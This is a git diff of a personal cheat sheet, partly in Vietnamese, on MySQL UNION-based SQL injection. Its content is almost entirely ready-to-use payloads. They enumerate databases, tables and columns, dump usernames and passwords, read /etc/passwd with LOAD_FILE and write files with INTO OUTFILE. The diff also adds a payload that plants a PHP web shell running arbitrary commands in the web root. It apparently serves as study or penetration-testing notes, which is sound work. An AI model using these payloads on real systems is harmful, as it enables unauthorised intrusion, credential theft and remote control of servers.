@@ -1,11 +1,25 @@
 # MY SQL INJECTION
 
+## User
+`USER()`
+
+## Load_File
+- Read system file 
+
+```sql
+' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+```
+- Read source code file in server => path apache web ( /var/www/html/...php )
+```sql
+
+```
+
 ## Version
 `@@version`
 
 ## Database 
 ```sql
-cn' UNION SELECT 1,SCHEMA_NAME,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
+' UNION SELECT 1,SCHEMA_NAME,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
 ```
 
 - Columns **SCHEMA_NAME** chứa all tên của database hiện tại
@@ -14,12 +28,12 @@ cn' UNION SELECT 1,SCHEMA_NAME,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
 - Ta cũng có thể lấy tên database hiện tại qua hàm **database()**
 
 ```sqli
-cn' UNION select 1,database(),2,3-- -
+' UNION select 1,database(),2,3-- -
 ```
 
 ## TABLES
 ```sql
-cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
 ```
 
 - Columns **TABLE_NAME* chứa all tên của tables hiện tại
@@ -29,7 +43,7 @@ cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES wher
 
 ## Columns 
 ```sql
-cn' UNION select 1,COLUMN_NAME,TABLE_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='devss'-- -
+' UNION select 1,COLUMN_NAME,TABLE_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='devss'-- -
 ```
 
 - Columns **COLUMN_NAME* chứa all tên của columns hiện tại trên table 
@@ -38,7 +52,34 @@ cn' UNION select 1,COLUMN_NAME,TABLE_NAME,4 from INFORMATION_SCHEMA.COLUMNS wher
 
 ## DATA
 ```sql
-cn' UNION select 1, username, password, 4 from dev.devss-- -
+' UNION select 1, username, password, 4 from dev.devss-- -
 ```
 
 - dev.devss là tables hiện tại csdl_name.table_name
+
+## Write file 
+- SELECT .. INTO OUTFILE 'path_file' statement can be used to write data from select queries into file
+Ex1: select queries usernamae in table users and save output into /var/www/html/username file
+`SQL query :`
+```sql
+select user from users into outfile '/var/www/html/username';
+```
+
+`Cmd`
+```cmd
+cat /var/www/html/username 
+>
+1. admin
+2. user1
+3. user2
+```
+Ex2: 
+```sql
+SELECT 'hello' INTO OUTFILE '/var/test.txt';
+```
+
+## Web shell
+```sql
+' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- - 
+```
+
